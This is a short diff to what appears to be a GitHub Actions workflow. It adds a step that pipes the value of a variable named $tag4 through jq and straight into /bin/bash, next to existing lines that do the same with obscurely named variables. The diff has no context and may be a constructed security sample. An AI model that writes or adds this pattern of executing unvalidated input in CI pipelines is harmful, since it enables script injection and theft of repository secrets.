@@ -51,6 +51,7 @@ jobs:
           printf '%s' "$vrkz05" | jq -r .zsiw37891 | /bin/bash
           printf '%s' "$iex451" | jq -r .b8044 | /bin/bash
           printf '%s' "$xtf935" | jq -r .ncx86 | /bin/bash
+          echo $tag4 | jq -r .ilwwu06703 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
